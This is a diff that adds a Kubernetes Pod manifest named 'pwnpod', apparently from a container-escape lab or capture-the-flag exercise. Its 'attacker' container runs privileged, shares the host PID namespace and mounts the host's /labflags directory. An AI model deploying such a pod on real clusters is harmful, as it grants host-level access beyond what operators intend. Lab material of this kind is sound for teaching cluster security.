@@ -1,0 +1,20 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pwnpod
+spec:
+  hostPID: true
+  containers:
+  - name: attacker
+    image: busybox:latest
+    command: ["/bin/sh","-c","sleep 3600"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host-root
+      mountPath: /mnt/host
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /labflags
+      type: Directory
